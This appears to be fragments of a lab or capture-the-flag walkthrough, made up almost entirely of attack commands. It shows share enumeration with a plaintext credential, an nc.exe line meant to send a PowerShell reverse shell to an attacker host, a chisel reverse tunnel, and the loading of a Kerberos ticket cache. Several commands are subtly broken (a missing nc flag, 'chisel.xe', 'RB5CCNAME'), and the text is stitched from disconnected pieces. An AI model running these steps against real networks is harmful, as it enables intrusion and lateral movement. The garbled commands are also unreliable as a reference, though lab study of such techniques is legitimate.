...
```
nxc 10.10.11.187 -u 'C.Bum' -p 'Tikkycoll_431012284' --shares
...
```
nc.exe powershell.exe 10.10.14.25 9998
...
```
./chisel.xe client 10.10.14.25:9001 R:8002:127.0.0.1:8000
```
...
```
export RB5CCNAME=ticket.ccache
